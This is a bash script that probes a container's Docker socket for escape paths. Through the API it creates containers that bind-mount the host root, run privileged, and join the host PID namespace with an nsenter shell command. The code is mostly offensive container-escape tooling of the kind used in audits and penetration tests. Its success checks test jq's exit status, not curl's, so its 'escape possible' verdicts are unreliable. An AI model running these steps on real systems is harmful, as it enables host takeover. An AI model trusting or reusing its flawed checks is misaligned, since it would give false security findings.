#!/bin/bash
# Docker Socket Security Enumeration Script
# Enumerates docker.sock, permissions, escape vectors, and API availability
banner() {
    echo -e "\e[35m[+] $1\e[0m"
}

section() {
    echo -e "\n\e[36m=== $1 ===\e[0m"
}

section "Checking Docker socket existence"
if [ -S /var/run/docker.sock ]; then
    banner "/var/run/docker.sock FOUND"
else
    echo "[!] Docker socket NOT found"
    exit 0
fi

section "Socket permissions"
ls -l /var/run/docker.sock

SOCK_OWNER=$(stat -c '%U' /var/run/docker.sock)
SOCK_GROUP=$(stat -c '%G' /var/run/docker.sock)
SOCK_PERMS=$(stat -c '%a' /var/run/docker.sock)

banner "Owner: $SOCK_OWNER"
banner "Group: $SOCK_GROUP"
banner "Permissions: $SOCK_PERMS"

if [[ "$SOCK_PERMS" =~ ^[67] ]]; then
    banner "⚠️ WORLD READABLE/WRITABLE = HIGH RISK"
fi

section "Checking if we can talk to Docker API"
curl --unix-socket /var/run/docker.sock http://localhost/_ping 2>/dev/null
if [ $? -eq 0 ]; then
    banner "Docker API reachable ✔"
else
    echo "Docker API unreachable ❌"
fi

section "Checking Docker version"
curl --unix-socket /var/run/docker.sock http://localhost/version 2>/dev/null | jq .

section "Listing containers (read access)"
curl --unix-socket /var/run/docker.sock http://localhost/containers/json?all=1 2>/dev/null | jq .

section "Checking if we can create a container (write access)"
curl -X POST --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"Image":"alpine","Cmd":["echo","test"],"HostConfig":{}}' \
    http://localhost/containers/create?name=docker_test 2>/dev/null \
    | jq .

RET=$?
if [ $RET -eq 0 ]; then
    banner "✔ Write access: CAN CREATE CONTAINERS (ESCAPE POSSIBLE)"
else
    echo "❌ Cannot create containers"
fi

section "Checking ability to mount host filesystem"
curl -X POST --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{
        "Image":"alpine",
        "Cmd":["echo","mnt-test"],
        "HostConfig":{
            "Binds":["/:/mnt"]
        }
    }' \
    http://localhost/containers/create?name=test_mount \
    2>/dev/null | jq .

RET=$?
if [ $RET -eq 0 ]; then
    banner "✔ Host mount allowed: FULL BREAKOUT AVAILABLE"
else
    echo "❌ Cannot mount host filesystem"
fi

section "Checking privilege escalation possibilities"

# Privileged check (dry-run container creation)
curl -X POST --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{
        "Image":"alpine",
        "Cmd":["id"],
        "HostConfig":{"Privileged":true}
    }' \
    http://localhost/containers/create?name=test_priv \
    2>/dev/null | jq .

if [ $? -eq 0 ]; then
    banner "✔ Privileged container creation possible (instant host escape)"
else
    echo "❌ Privileged containers blocked"
fi

section "Checking ability to join host namespaces"
curl -X POST --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{
        "Image":"alpine",
        "Cmd":["nsenter","--target","1","--mount","--pid","--net","sh"],
        "HostConfig":{"PidMode":"host"}
    }' \
    http://localhost/containers/create?name=test_ns \
    2>/dev/null | jq .

if [ $? -eq 0 ]; then
    banner "✔ Host PID namespace accessible (nsenter escape possible)"
else
    echo "❌ Host PID namespace denied"
fi

section "Environment checks"
echo "User: $(id)"
echo "Groups: $(groups)"
echo "Hostname: $(hostname)"

section "Checking for additional sensitive mounts"
mount | grep -E "docker|container|overlay|cgroup|proc"

section "Summary (auto-assessment)"
echo
if [ "$RET" -eq 0 ]; then
    banner "🔥: This container can likely escape to the host"
else
    echo "Moderate or low risk"
fi

echo -e "\nDone."
